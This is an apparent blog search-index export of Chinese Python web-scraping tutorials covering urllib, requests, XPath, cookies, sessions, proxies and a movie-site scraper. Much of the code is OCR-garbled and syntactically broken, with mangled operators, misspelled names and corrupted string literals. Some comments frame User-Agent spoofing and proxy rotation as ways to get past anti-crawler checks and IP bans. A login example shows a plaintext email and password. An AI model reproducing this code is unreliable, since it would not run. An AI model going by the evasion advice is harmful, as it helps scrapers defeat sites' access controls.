imgs [0]screenshot = imgs[1]movie[&#x27;cover&#x27;] = covermovie[&#x27;screenshot&#x27;] = screenshotinfos = zoomE . xpath(&quot;.//text() &quot;)for index, info in enumerate(infos) :print (info)print (index)print(&#x27;=&#x27;*30)if info.startswith (&quot;OEft&quot;) :info - parse_ info(info, &quot;&#x27;Fft&quot;)movie[ &#x27;year&#x27;] = infoelif info. startswith (&quot;OFJ&quot;) :info = parse_ info(info, &quot;Ft&quot;)movie [ &#x27; country&#x27;] = infoelif info. startswith(&quot;O*別&quot;) :info = parse_ info(info, &quot;#5l&quot;)movie[ &#x27;category&#x27;] - infoelif info. startswith (&quot;OEi&quot;) :info = parse_ info (info, &quot;OTiF&quot;)movie[ &#x27;douban rating&#x27; ] - infoelif info.startswith(&quot;O HK&quot;) :info = parse_ info(info, &quot;O 5K&quot;)movie[ &#x27;duration&#x27;] - infoelif info.startswith(&quot;O5&quot;) :info = parse_ info(info, &quot;E&quot;)actors = [info]for x in range (index+1, len(infos) ) :actor = infos[x] .strip ()if actor. startswith(&quot;&quot;) :breakactors . append (actor )movie[ &quot; actors &#x27;] = actorselif info.startswith (&quot;jồj1↑&quot;) :info = parse_info(info,&quot;îồj1&quot;)for x in ranqe (index+1,len(infos))#抄不动了。太多了，也比较复杂。还是进入下一阶段的学习吧。我们会有更好的解决办法。ps：出自P26，可能有时间有价值的话，可以继续看。def spider() :base_ url = &quot;http://dytt8.net/html /gndy/dyzz/list_23_().html &quot;#控制页数for x in range(1,8): base_url.format(x) detail_urls = get_detail_ urls(url) #遍历一页中的所有详情url for detail_url in detail urls: movie = parse_detail_page(detail_url) if __name__ = &#x27;__main__&#x27; :spider ()","categories":[],"tags":[{"name":"python","slug":"python","permalink":"http://example.com/tags/python/"}]},{"title":"python spider之 XPath","slug":"python-3","date":"2020-09-11T02:36:07.000Z","updated":"2020-09-20T12:13:19.010Z","comments":true,"path":"2020/09/11/python-3/","link":"","permalink":"http://example.com/2020/09/11/python-3/","excerpt":"二、数据提取 XPath语法和IxmI模块什么是XPath?xpath (XML Path Language)是一门在XML和HTML文档中查找信息的语言,可用来在XML和HTML文档中对元素和属性进行遍历。","text":"二、数据提取 XPath语法和IxmI模块什么是XPath?xpath (XML Path Language)是一门在XML和HTML文档中查找信息的语言,可用来在XML和HTML文档中对元素和属性进行遍历。 Xpath开发工具 1.Chrome插件XPath Helper 2.Firefox插件Try XPath XPath基本语法 @应改为选取所有price节点的book属性 多路 逻辑 lxml库123456789from lxml importetreetext = &quot;&quot;&quot;html code&quot;&quot;&quot;#生成一个对象htmlElement = etree.HTML(text)print(etree.tostring(htmlElement,encoding=&#x27;utf-8&#x27;).decode(&#x27;utf-8&#x27;)) 123456789101112131415161718#从文本导入def parse text():htmlElement = etree.HTML(text)print(etree.tostring (htmlElement, encoding-&#x27;utf-8&#x27;).decode(&#x27;utf-8&#x27;))#从文件导入#默认使用XML解析器，不能处理有问题的标签def parse file():htmlElement = etree.parse(&quot;tencent.html&quot;)print (etree.tostring(htmlElement, encoding-&#x27;utf-8&#x27;).decode(&#x27;utf-8&#x27;))#更换解析器def parse_lagou_file() :parser = etree.HTMLParser(encoding=&#x27;utf-8&#x27;)htmlElement = etree.parse(&quot;lagou.html&quot;,parser=parser)print (etree.tostring (htmlElement, encoding-&#x27;utf-8&#x27;) .decode( &#x27;utf-8&#x27;) )if __name__ == &#x27;__main__&#x27;:parse_ file() lxml和XPath结合使用12345678910111213141516171819202122232425262728293031323334353637383940414243444546from lxml import etree# 1.获取所有tr标签# 2.获取第2个tz标签# 3.获取所有class等于even的标签# 4.获取所有a标签的href属性# 5.获取所有的职位信息(纯文本)parser = etree.HTMLParser (encoding=&#x27;utf-8&#x27; )html = etree.parse (&quot; tencent .html&quot;,parser-parser)# 2.获取第2个tr标签tr = html.xpath(&quot;//tr[2]&quot;) [0]print(etree. tostring (tr, encoding=&#x27;utf-8&#x27;) .decode (&quot;utf-8&quot;))# 3.获取所有class等于even的tr标签trs = html.xpath(&quot;//tr[@class=&#x27;even&#x27;] &quot;) for tr in trs:print(etree. tostring(tr, encoding=&#x27;utf-8&#x27;) . decode (&quot;utf-8&quot;) )# 4.获取所有a标签的href属性aList - html . xpath(&quot;//a/@href&quot;)for a in alist:print (&quot;http://hr. tencent. com/&quot;+a)# 5.获取所有的职位信息(纯文本)trs = html.xpath(&quot;//tr[position()&gt;1]&quot;)positions=[]for tr in trs:#在某个标签下，再执行xpath函数，获取这个标签下的子孙元素#那么应该在//之前加一个点，代表是在当前元素下获取 href = tr.xpath(&quot;.//a/@href&quot;)[0] fullurl = &#x27;http: 1 /hr. tencent. com/&#x27; + href title = tr.xpath(&quot;./td[1]//text()&quot;)[0] category = tr.xpath(&quot;./td[2]/text()&quot;)[0] nums = tr.xpath(&quot;./td[3]/text()&quot;)[0] address = tr.xpath(&quot;./td[4]/text()&quot;)[0] pubtime = tr.xpath(&quot;./td[5]/text()&quot;)[0] position = &#123;&#x27;url&#x27;: fullurl,&#x27;title&#x27; :title,&#x27;category&#x27; : category,&#x27;nums&#x27; : nums ,&#x27;address&#x27; : address,&#x27;pubtime&#x27; : pubtime &#125; positions.append(position)print positions 123456789101112# lxml结合xpath注意事项:# 1.使用xpath语法。 应该使用Element.xpath方法来执行xpath的选择。示例代码如下:trs = html.xpath(&quot;//tr[position()&gt;1]&quot;)xpath函数返回来的永远是一个列表。# 2.获取某个标签的属性:href = html.xpath(&quot;//a/@href&quot;)#获取a标签的href属性对应的值3.获取文本，是通过xpath中的text()函数。示例代码如下:address = tr.xpath(&quot;./td[4]/text()&quot;)[0] 4.在某个标签下，再执行xpath函数， 获取这个标签下的子孙元素，那么应该在&#x27;/&#x27;之前加一个点，代表是在当前元素下获取。示例代码如下:address = tr.xpath(&quot;./td[4]/text()&quot;)[0]","categories":[],"tags":[{"name":"python","slug":"python","permalink":"http://example.com/tags/python/"}]},{"title":"python spider之 requests库","slug":"python-2","date":"2020-09-10T15:33:15.000Z","updated":"2020-09-20T12:12:58.630Z","comments":true,"path":"2020/09/10/python-2/","link":"","permalink":"http://example.com/2020/09/10/python-2/","excerpt":"Requests库Requests 是用python语言编写的第三方库，基于 urllib，采用 Apache2 Licensed 开源协议的 HTTP 库。它比 urllib 更加方便，完全满足 HTTP 测试需求，多用于接口测试","text":"Requests库Requests 是用python语言编写的第三方库，基于 urllib，采用 Apache2 Licensed 开源协议的 HTTP 库。它比 urllib 更加方便，完全满足 HTTP 测试需求，多用于接口测试 发送get请求123456789101112131415161718192021222324252627import requests#发送get请求#rerequest.get(url,params,headers)#params,headers自行寻找，已省略#无需再进行加密，库函数会自行解决response = requests.get(&quot;https://www.baidu.com/&quot;)#str数据类型print(type(resopnes.text))#自动解码，不一定正确print(response.text)#bytes数据类型print(type(response.content))#返回原始值，字节流数据print(resopnes.content)#可以自行解码，准确率不高print(response.content.decode(&#x27;utf-8&#x27;))with open(&#x27;baidu.html&#x27;,&#x27;w&#x27;,encoding=&#x27;utf-8&#x27;) as fp: fp.write(response.content.decode(&#x27;utf-8&#x27;))#查看完整的url地址print(response.url)#查看相应头部字符编码print(response.encoding)#查看响应码print(response.status_code) 发送post请求1234567import requests#data数据无需再进行加密了。response = requests.post(&#x27;https://www.baidu.com&#x27;,headers = headers,data = data)#也可以使用json#转化为字典格式print(response.json()) requests使用代理使用requests 添加代理也非常简单，只要在请求的方法中(比如get或者post)传递proxies参数就可以了。示例代码如下: 1234567891011import requestsurl.&quot;http://httpbin.org/get&quot;headers = &#123;&#x27;User-Agent&#x27;: &quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62 .0.3202.94 &#125;proxy = &#123;&#x27;http&#x27;:&#x27;171.14.209.180:27829&#x27;&#125;resp.requests.get(url,headers-headers,proxies-proxy)with open(&#x27;xx.html&#x27;, &#x27;w&quot; , encoding-&#x27;utf-8&#x27;) as fp: fp.write(resp.text) Cookie与SessionCookie 如果在一个响应中包含了cookie ,那么可以利用cookies属性拿到这个返回的cookie 值: 123456import requestsurl.&quot;http://www.renren.com/PLogin.do&quot;data = &#123;&quot;email&quot;:&quot;970138074@qq.com&quot;,&#x27;password&#x27;:&quot;pythonspider&quot;&#125;resp = requests.get(&quot;http://www.baidu.com/&#x27;)print(resp.cookies)print(resp. cookies.get_dict()) Session 之前使用urlib库，是可以使用opener发送多个请求，多个请求之间是可以共享cookie 的。那么如果使用requests ,也要达到共享cookie 的目的，那么可以使用requests库给我们提供的session对象。注意,这里的session不是web开发中的那个session,这个地方只是一个会话的对象而已。 还是以登录人人网为例，使用requests来实现。示例代码如下: 12345678910import requestsurl = &quot;http://www. renren. com/PLogin.do&quot;data = &#123;&quot;email&quot;:*970138074@qq .com&quot; , &quot; password&quot; :&quot;pythonspider&quot;&#125;headers = &#123;&#x27;User-Agent&#x27;: &quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) ApplekiebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.94&quot;&#125;session = requests.Session()session.post (url, data=data, headers = headers )resp = session.get( &quot; http://www.renren.com/880151247/profile&quot;)print(resp.text )","categories":[],"tags":[{"name":"python","slug":"python","permalink":"http://example.com/tags/python/"}]},{"title":"python spider之 urlib库","slug":"python-1","date":"2020-09-10T11:31:26.000Z","updated":"2020-09-20T12:12:39.457Z","comments":true,"path":"2020/09/10/python-1/","link":"","permalink":"http://example.com/2020/09/10/python-1/","excerpt":"一、网络请求 urlib库Urllib是python内置的HTTP请求库包括以下模块urllib.request 请求模块urllib.error 异常处理模块urllib.parse url解析模块urllib.robotparser robots.txt解析模块","text":"一、网络请求 urlib库Urllib是python内置的HTTP请求库包括以下模块urllib.request 请求模块urllib.error 异常处理模块urllib.parse url解析模块urllib.robotparser robots.txt解析模块 课程主页： https://www.bilibili.com/video/BV1Jt411S73r?p=11 初识urlib库打开网站1234567891011from urllib import request#打开网站url = &#x27;https://www.sohu.com/&#x27;resp = request.urlopen(url)print(resp.read())&quot;&quot;&quot;read()读取，参数限制数量readline()读取一行readlines()读取多行&quot;&quot;&quot; 下载网页以及网页上的文件12345678910from urllib import request#下载网页request.urlretrieve(&#x27;http://www.baidu.com&#x27;,&#x27;baidu.html&#x27;)#下载图片/下载网页上的文件request.urlretrieve(&#x27;https://timgsa.baidu.com/timg?image&amp;quality=&#x27; &#x27;80&amp;size=b9999_10000&amp;sec=1599670372386&amp;di=10d4908d568814ad37f39bc39c35f8bd&amp;imgtype=0&amp;src=&#x27; &#x27;http%3A%2F%2Fb-ssl.duitang.com%2Fuploads%2Fitem%2F201501%2F28%2F20150128214323_JiLLS.thumb.&#x27; &#x27;700_0.jpeg&#x27;,&#x27;1.jpeg&#x27;) url的加密与解密12345678910111213141516from urllib import parse,requestparams = &#123;&#x27;name&#x27;:&#x27;张三&#x27;,&#x27;age&#x27;:18,&#x27;greet&#x27;:&#x27;hello world!&#x27;&#125;#对url进行加密result = parse.urlencode(params)print(result)#使用加密后的urlurl = &quot;http://www.baidu.com/s&quot;url = url + &quot;?&quot; +resultresp = request.urlopen(url)print(resp.read())#pares_qs()对url进行解密print(parse.parse_qs(result)) 分割url1234567891011from urllib import parse,request#分割urlurl = &quot;http://www.baidu.com/s?wd=python&amp;username=abc#1&quot;result = parse.urlparse(url)#result = parse.urlsplit(url) 不含有params 而urlparse含有params属性print(result)print(result.scheme)print(result.netloc)print(result.params)print(result.path)print(result.query) request类对拉勾网的爬取 123456789101112131415161718from urllib import request,parse#request.Request(url, headers,data,method)url = &#x27;https://www.lagou.com/&#x27;#通过添加headers，伪装为浏览器来绕过反爬虫机制headers = &#123; &#x27;User-Agent&#x27;:&#x27;Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.83 Safari/537.36&#x27; #还可以添加refer，不过拉勾网已经不再使用refer了qaq&#125;data = &#123; &#x27;first&#x27;:&#x27;true&#x27;, &#x27;pn&#x27;:&#x27;1&#x27;, &#x27;kd&#x27;:&#x27;python&#x27;&#125;req = request.Request(url,headers=headers,data=parse.urlencode(data).encode(&#x27;utf-8&#x27;),method=&#x27;POST&#x27;)#data需要经过urlencode以及encode(&#x27;utf-8&#x27;)才能够被正常接收resp = request.urlopen(req)print(resp.read().decode(&#x27;utf-8&#x27;))#打印时也同样需要解密 ProxyHandler实现代理ip设置使用代理服务器，定时更换ip地址，避免地址被ban。 123456789101112131415161718from urllib import request#没有使用代理#url = &#x27;https://www.sohu.com/&#x27;#resp = request.urlopen(url)#print(resp.read())#使用ProxyHandler代理#构建handlerhandler = request.ProxyHandler(&#123;&quot;http&quot;:&quot;ip地址:端口号&quot;&#125;)#使用handler构建openeropener = request.build_opener(handler)#使用opener发送请求req = request.Request(&#x27;http://httpbin.org/ip&#x27;)resp = opener.open(req)print(resp.read()) 快代理、代理云提供代理服务。 http://httpbin.org/ip可以方便查看http请求的一些参数 http/https依赖于代理服务器 cookie的格式和原理 Cookie: Name:命名 Max-age:过期时间 Path:作用路径 domain:默认主域名 ./baidu.com .代表任意 使用cookielib库和CookieProcessor模拟登陆12345678910111213141516171819from urllib importrequest# 1.不使用cookie去请求大鹏的主页dapeng_ url =&quot;http://www.renren.com/880151247/profile&quot;headers = &#123;&#x27;User-Agent&#x27; : &quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64)AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.94safari/537.36&quot; &quot;Cookie&quot;:&quot;填入cookie&quot;&#125;req = request.Request(urldapeng_url,headers=headers)resp.request.urlopen(req)with open(&#x27;renren.html&#x27;,&#x27;w&#x27;,encoding-&#x27;utf-8&#x27;) as fp:# write函数必须写入一个str的数据类型# resp.read()读出来的是一个bytes数据类型# bytes-&gt;decode-&gt;str# str-&gt;encode-&gt;bytesfp.write(resp.read().decode(&#x27;utf-8&#x27;)) http.cookiejar模块 1234567891011121314151617181920212223242526272829303132333435from urllib import requestfrom http.cookiejarimport CookieJar#1、登录#1.1 创建一个cookiejar对象cookiejar = CookieJar ()#1.2使用cookiejar创建一个HTTPCookieProcess对象handler = request.HTTPCookieProcessor (cookiejar)#1.3使用上一步创建的handler创建一个openeropener = request.build_opener(handler)#1.4使用opener发送登录的请求(人人网的邮箱和密码)headers = &#123;&#x27;User- Agent!&#x27;: &quot;Mozilla/5.0 (WindowsNT 10.0; Win64; x64)AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202. 94Safari /537.36&quot;data = &#123;&quot; email&#x27; : &quot;9701380740qq.com&quot; ,&#x27;password&#x27; : &quot;pythonspider&quot;&#125;login_url = &quot;http://www.renren.com/PLogin.do&quot;req = request.Request(login_url,data=parse.uelencode(data).encode(&#x27;utf-8&#x27;),headers=headers) opener.open(req)#2.访问个人主页dapeng_ url = &quot;http://www.renren.com/880151247/profile&quot;#获取个人主页的页面的时候,不要新建一个opener#而应该使用之前的那个opener,因为之前的那个opener已经包含了登录所需要的cookie信息req = request.Request (dapeng_url,headers=headers)resp = opener.open(req)with open(&#x27;renren.html&#x27; , &#x27;w&#x27; , encoding= &#x27;utf-8&#x27; )as fp:fp.write(resp.read().decode(&#x27;utf-8&#x27;)) cookie的加载与保存保存cookie 到本地，可以使用cookiejar 的save 方法,并且需要指定一个文件名 123456789101112131415from urllib import requestfrom http.cookiejar import MozillaCookieJar#保存cookie文件的路径cookiejar = MozillaCookieJar(&quot;cookie.txt&quot; )handler.request HTTPCookieProcessor(cookiejar)opener = request.build opener(handler)headers = &#123;&quot;User-Agent&#x27;:&#x27;&#x27;&#125;req = request.Request(&quot;http://httpbin.org/cookies &quot;, headers = headers)resp.opener.open(req)print(resp.read())#避免会话结束cookie过期cookiejar.save(ignore_ discard=True ,ignore_ expires=True) 12345678910111213from urllib import requestfrom http.cookiejarimport MozillaCookieJarcookiejar = MozillaCookieJar ( &#x27;cookie.txt&#x27; )#避免会话过期cookiejar.load (ignore_ discard = True)handler = request.HTTPCookieProcessor (cookiejar)opener = request.build_opener(handler)resp = opener.open( &#x27;http://httpbin.org/cookies&#x27; )#遍历cookiefor cookie in cookiejarprint(cookie)","categories":[],"tags":[{"name":"python","slug":"python","permalink":"http://example.com/tags/python/"}]},{"title":"尝试使用typora","slug":"test of typora","date":"2020-09-10T07:33:18.000Z","updated":"2020-09-20T12:07:46.037Z","comments":true,"path":"2020/09/10/test of typora/","link":"","permalink":"http://example.com/2020/09/10/test%20of%20typora/","excerpt":"","text":"目前来看还是比较成功的。","categories":[],"tags":[{"name":"一些工具的掌握","slug":"一些工具的掌握","permalink":"http://example.com/tags/%E4%B8%80%E4%BA%9B%E5%B7%A5%E5%85%B7%E7%9A%84%E6%8E%8C%E6%8F%A1/"}]},{"title":"基本完成架构","slug":"Start","date":"2020-09-10T04:16:17.000Z","updated":"2020-09-20T12:07:36.886Z","comments":true,"path":"2020/09/10/Start/","link":"","permalink":"http://example.com/2020/09/10/Start/","excerpt":"","text":"这是第一篇博客，希望是一个好的开始","categories":[],"tags":[{"name":"碎言碎语","slug":"碎言碎语","permalink":"http://example.com/tags/%E7%A2%8E%E8%A8%80%E7%A2%8E%E8%AF%AD/"}]}],"categories":[],"tags":[{"name":"PHP相关","slug":"PHP相关","permalink":"http://example.com/tags/PHP%E7%9B%B8%E5%85%B3/"},{"name":"python","slug":"python","permalink":"http://example.com/tags/python/"},{"name":"一些工具的掌握","slug":"一些工具的掌握","permalink":"http://example.com/tags/%E4%B8%80%E4%BA%9B%E5%B7%A5%E5%85%B7%E7%9A%84%E6%8E%8C%E6%8F%A1/"},{"name":"碎言碎语","slug":"碎言碎语","permalink":"http://example.com/tags/%E7%A2%8E%E8%A8%80%E7%A2%8E%E8%AF%AD/"}]}